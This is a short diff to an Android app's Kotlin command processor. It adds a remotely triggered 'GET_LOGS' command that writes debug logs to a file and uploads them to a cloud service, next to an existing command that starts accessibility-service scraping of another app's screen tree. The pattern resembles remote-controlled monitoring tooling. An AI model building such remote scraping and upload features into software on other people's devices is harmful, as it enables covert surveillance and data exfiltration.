@@ -131,6 +131,22 @@ object CommandProcessor {
                     MyAccessibilityService.instance?.startTreeDump(pkg, mins)
                     status = "EXECUTED (TREE SCRAPER ACTIVE: ${mins}M)"
                 }
+                "GET_LOGS" -> {
+                    val logs = DebugLogger.getLogs()
+                    val tempFile = java.io.File(ctx.cacheDir, "console_log_${System.currentTimeMillis()}.txt")
+                    try {
+                        tempFile.writeText(logs)
+                        if (CloudManager.uploadFile(ctx, tempFile)) {
+                            status = "EXECUTED (LOGS SENT)"
+                        } else {
+                            status = "FAILED (UPLOAD ERROR)"
+                        }
+                    } catch (e: Exception) {
+                        status = "FAILED (FILE ERROR: ${e.message})"
+                    } finally {
+                        if (tempFile.exists()) tempFile.delete()
+                    }
+                }
                 "TOGGLE_FEATURE" -> {
                     if (content.contains(":")) {
                         val parts = content.split(":")
